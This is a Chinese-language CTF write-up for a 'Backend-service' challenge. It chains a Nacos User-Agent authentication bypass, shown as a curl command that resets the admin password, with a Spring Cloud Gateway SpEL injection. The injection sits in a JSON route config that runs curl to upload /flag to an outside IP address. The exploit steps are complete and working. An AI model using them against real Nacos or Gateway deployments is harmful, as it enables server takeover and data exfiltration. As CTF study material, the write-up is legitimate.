## **Backend-service**

nacos有很多历史漏洞，用UA绕过鉴权的那个改nacos用户的密码可进入nacos后台

    
    
    curl -X PUT 'http://IP:PORT/nacos/v1/auth/users?accessToken=' -H 'User-Agent:Nacos-Server' -d 'username=nacos&newPassword=root'
    

看题目给的附件来代码审计，东西很少，项目程序只有一个StartAPP

    
    
    //
    // Source code recreated from a .class file by IntelliJ IDEA
    // (powered by FernFlower decompiler)
    //
    
    package com.gateway;
    
    import org.springframework.boot.SpringApplication;
    import org.springframework.boot.autoconfigure.SpringBootApplication;
    import org.springframework.cloud.client.discovery.EnableDiscoveryClient;
    import org.springframework.web.bind.annotation.RestController;
    
    @SpringBootApplication
    @RestController
    @EnableDiscoveryClient
    public class StartApp {
        public StartApp() {
        }
    
        public static void main(String[] args) {
            SpringApplication.run(StartApp.class, args);
        }
    }
    

发现两个配置文件，application.yaml和bootstrap.yml，nacos中后者优先级更高

    
    
    spring:
      cloud:
        nacos:
          discovery:
            server-addr: 127.0.0.1:8888
          config:
            name: backcfg
            file-extension: json
            group: DEFAULT_GROUP
            server-addr: 127.0.0.1:8888
    

了解了nacos之后，知道此处是会调用名字backcfg，扩展名json，group用DEFAULT_GROUP的一个远程配置。

做CTF题最重要的就是揣测出题人的想法来得到解题思路，综合现在得到的信息，下一步就该在nacos配置中心里面新建一个这样的配置让后台服务调用，且必须是json格式的，至于会有什么效果现在还不清楚

顺便再看一眼源码，注意到startAPP是放在gateway文件夹下的，而且这个是唯一的项目程序。组合gateway、nacos、配置、RCE等关键词查查有没有这方面的漏洞能造成RCE。顺便一提，搜索姿势很重要，搜索引擎也很重要，如果百度谷歌都找不到想要的答案的话可以试试去Freebuf和先知社区这些地方找找（或者从百度、谷歌这些搜索引擎加site限定来搜安全社区的内容）

找到一篇文章 <https://xz.aliyun.com/t/11493#toc-5>

写出json格式的payload:

    
    
    {
        "spring": {
            "cloud": {
                "gateway": {
                    "routes": [
                        {
                            "id": "whocansee",
                            "order": 0,
                            "uri": "lb://backendservice",
                            "predicates": [
                                "Path=/echo/**"
                            ],
                            "filters": [
                                {
                                    "name": "AddResponseHeader",
                                    "args": {
                                        "name": "result",
                                        "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'curl','http://47.113.202.32:23233','-T','/flag'}).getInputStream())).replaceAll('\n','').replaceAll('\r','')}"
                                    }
                                }
                            ]
                        }
                    ]
                }
            }
        }
    }
    

## 总结

标准的一道信息题，算是很契合实战中遇到陌生环境的情况，不过题目给的提示很多，实战中缺少的信息得靠平日里积攒的经验补足。

